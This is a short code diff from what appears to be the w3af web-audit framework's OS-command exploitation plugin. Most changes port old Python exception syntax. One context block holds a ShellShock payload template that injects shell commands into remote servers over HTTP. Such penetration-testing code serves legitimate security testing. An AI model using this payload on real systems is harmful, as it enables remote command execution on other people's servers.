@@ -99,7 +99,7 @@ class BasicExploitStrategy(SeparatorExploitStrategy, CommonAttackMethods):
     def extract_result(self, http_response):
         try:
             return self._cut(http_response.get_body())
-        except BodyCutException, bce:
+        except BodyCutException as bce:
             issue = 'https://github.com/andresriancho/w3af/issues/5139'
 
             msg = ('Unexpected exception "%s" while trying to extract the'
@@ -171,7 +171,7 @@ class ShellShock(ExploitStrategy):
     # Even after applying the variables above this is a format string which
     # receives the command to run. Note the %%s below:
     PAYLOAD_FMT = '() { :;};PATH=$PATH:%s;%%s | sed "s/$/%s/" | tr -d "\\n\\r"'\
-                  ' | /usr/bin/awk "{print \\"%s: \\"\$0\\"\\n\\"}"'
+                  ' | /usr/bin/awk "{print \\"%s: \\"\\$0\\"\\n\\"}"'
     PAYLOAD_FMT = PAYLOAD_FMT % (PATH, NEW_LINE, INJECTED_HEADER)
 
     def send(self, cmd, opener):
@@ -320,7 +320,7 @@ class OSCommandingShell(ExecShell):
         try:
             http_response = self.strategy.send(strategy_cmd,
                                                self.get_url_opener())
-        except BaseFrameworkException, e:
+        except BaseFrameworkException as e:
             msg = ('Error "%s" while sending HTTP request with OS command to'
                    ' remote host. Please try again.')
             return msg % e
